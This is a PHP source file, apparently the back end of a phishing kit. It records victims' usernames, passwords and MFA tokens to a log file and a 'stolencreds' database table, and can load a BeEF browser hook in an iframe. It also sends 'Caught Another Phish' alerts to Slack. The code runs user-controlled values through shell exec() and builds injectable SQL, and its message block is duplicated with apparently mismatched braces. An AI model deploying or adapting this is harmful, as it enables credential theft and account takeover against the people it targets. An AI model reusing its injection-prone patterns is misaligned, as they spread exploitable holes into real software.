<?php

// Set Slack Webhook URL
$slackurl = "https://hooks.slack.com/services/TOKEN_GOES_HERE";
$slackchannel = "#SLACK_CHANNEL";
$slackemoji = ":see_no_evil:";
$slackbotname = "PhishBot";

// Set Optional BEEF Hook URL (http://YOUR-IP-HERE:3000/hook.js)
$BEEFUrl = "";

// Your API URL Here (https://This web site)
$APIURI = "https://YOUR_API_HERE";

// Receives Required Parameters and Sets Variables
$ip = $_SERVER['REMOTE_ADDR'];
$user = $_REQUEST['username'];
$pass = $_REQUEST['password'];
$portal = $_REQUEST['project'];
$redirect = $_REQUEST['redirect'];

// Receives Optional Parameters and Overrides Variables
if(isset($_REQUEST['token'])){$MFAToken = $_REQUEST['token'];}else{$MFAToken = "";}
if(isset($_REQUEST['slackemoji'])){$slackemoji = $_REQUEST['slackemoji'];}
if(isset($_REQUEST['slackbotname'])){$slackbotname = $_REQUEST['slackbotname'];}

// Makes Password Safe for DB
$user = stripslashes($user);

// Pulls in Required Connection Variables for DB
require_once 'dbconfig.php';

// Create connection
$conn = mysqli_connect($servername, $username, $password, $dbname);
// Check connection
if ($conn->connect_error) {
    die("Connection failed: " . $conn->connect_error);
}

// Don't Do Anything if the User is Blank (Helps Avoid False Submissions)
if($user != ""){

// Writes User and Password to a Local Log (In Case DB Insert Fails)
$myfile = fopen("/var/www/html/logs.txt", "a") or die("Unable to open file!");
$txt = $user." ".$pass."\n\r\n\r";
fwrite($myfile, "\n". $txt);
fclose($myfile);

// Inserts Captured Information Into MySQL DB
$sql = "INSERT INTO stolencreds(username,password,entered,ip,location,token) VALUES('$user','$pass',NOW(),'$ip','$portal','$MFAToken');";
$result = $conn->query($sql);

printf($conn->error);
$conn->close();

}

?>

<HTML>
<HEAD>
<style>
body {
    margin: 0;
}
</style>
</HEAD>
<BODY>

<?php
// Launches Redirect Location in iFRAME for Persistent BeEF Hooking.  For Best Results Use a Clickjacking Vulnerable Redirect Variable
if($redirect != ""){
?>

<iframe src="<?php echo $redirect; ?>" style="border: 0; width: 100%; height: 100%"></iframe>

<?php
}
// Performs BEEF Hook if Set
if($BEEFUrl != ""){?>
<script src= "<?php echo $BEEFUrl; ?>" type="text/javascript"></script>
<?php } ?>
</BODY>
</HTML>


<?php

// Compose URL for Slack Message to Take Directly to Results
$slacklink = $APIURI."/results/index.php?project=".$portal;

// Don't Do Anything if the User is Blank (Helps Avoid False Submissions)
if($user != ""){

// Only Proceed if There is a Password
if($pass != ""){

// Judge Password Complexity
if (preg_match("#.*^(?=.{8,20})(?=.*[a-z])(?=.*[A-Z])(?=.*[0-9]).*$#", $pass)){
    $passstrength = ":thumbsup:";
} else {
    $passstrength = ":thumbsdown:";
}
    
//Checks HaveIBeenPwned DB
$sha1pass = strtoupper(sha1($pass));

//echo $sha1pass."\r\n";

$cmd2 = 'curl -s -X GET "https://api.pwnedpasswords.com/range/'.substr($sha1pass, 0, 5).'"';

//echo $cmd2;

exec($cmd2);

// Executes the curl command
exec($cmd2,$pwned);

$pwnedarray = array();

foreach($pwned as $pwned2){
$pwnedarray[] = substr($pwned2, 0, strrpos($pwned2, ':'));
}

if (in_array(substr($sha1pass, 5), $pwnedarray)) {
    $TroyHunt = "yes";
} else $TroyHunt = "no";

// If the Password is Set, Change Slack Message
$message = "Caught Another Phish at ".$portal."! (<".$slacklink."|".$user.">)\r\nPassword Strength is ".$passstrength;

} else {

// If the Password is Not Set, Do Not Include Password Strength in Slack Message
$message = "Caught Another Phish at ".$portal."! (<".$slacklink."|".$user.">)";

}

if($TroyHunt == "yes"){$message = $message."\r\n*_HaveIBeenPwned Hit_*";}

// If the Password is Set, Change Slack Message
$message = "Caught Another Phish at ".$portal."! (<".$slacklink."|".$user.">)\r\nPassword Strength is ".$passstrength;

} else {

// If the Password is Not Set, Do Not Include Password Strength in Slack Message
$message = "Caught Another Phish at ".$portal."! (<".$slacklink."|".$user.">)";

}

// Execute Slack Incoming Webhook
$cmd = 'curl -s -X POST --data-urlencode \'payload={"channel": "'.$slackchannel.'", "username": "'.$slackbotname.'", "text": "'.$message.'", "icon_emoji": "'.$slackemoji.'"}\' '.$slackurl.'';

exec($cmd);

}

?>
